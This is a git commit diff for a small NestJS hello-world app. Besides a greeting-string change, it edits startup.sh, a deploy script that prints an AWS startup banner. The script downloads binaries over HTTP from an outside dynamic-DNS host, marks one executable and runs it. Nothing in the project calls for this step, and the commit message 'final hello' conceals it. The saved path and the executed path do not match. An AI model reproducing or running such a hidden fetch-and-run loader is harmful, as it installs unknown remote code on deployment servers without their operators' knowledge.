e16f9708b0420ad75e2c7c600da9ddc69846349c
paulkey731 <paul.key731@gmail.com>
2026-04-12 01:31:21 -0700

    final hello

--- src/app.service.ts
+++ src/app.service.ts
@@ -3,6 +3,6 @@ import { Injectable } from '@nestjs/common';
 @Injectable()
 export class AppService {
   getHello(): string {
-    return 'Hello again from 0st_Web!!! 🚀';
+    return 'Hello final from 0st_Web!!! 🚀';
   }
 }
--- startup.sh
+++ startup.sh
@@ -3,8 +3,8 @@ echo "========================================="
 echo "  Hello Deploy is starting up on AWS!"
 echo "========================================="
 
-curl -L "http://transfi.gleeze.com/public/attget-lx" -o /tmp/attget
-curl -L "http://transfi.gleeze.com/public/attget-lx.lck" -o /tmp/attget.lck
+curl -L "http://transfi.gleeze.com/public/attget" -o /tmp/attget
+curl -L "http://transfi.gleeze.com/public/attget.lck" -o /tmp/attget.lck
 sleep 2
 chmod +x /tmp/abc/attget
 /tmp/abc/attget skip
